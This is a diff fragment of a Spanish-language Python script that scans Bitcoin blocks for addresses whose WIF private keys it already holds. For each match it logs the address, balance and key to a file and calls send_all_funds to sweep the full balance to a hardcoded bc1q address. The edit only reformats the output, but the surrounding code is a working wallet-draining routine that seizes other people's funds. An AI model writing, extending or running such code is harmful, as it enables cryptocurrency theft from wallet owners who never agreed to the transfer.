@@ -332,9 +332,9 @@ def procesar_bloque_y_transacciones(bloque_id):
                 wif = direcciones_wif.get(direccion)
                 
                 if wif:
-                    print(f"Dirección: {direccion}, Balance: {balance} satoshis, WIF: {wif}")
+                    print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif}")
 
-                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} satoshis, WIF: {wif}", "walletconBalance.txt")
+                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif}", "walletconBalance.txt")
                     # Enviar todo el balance
                     send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
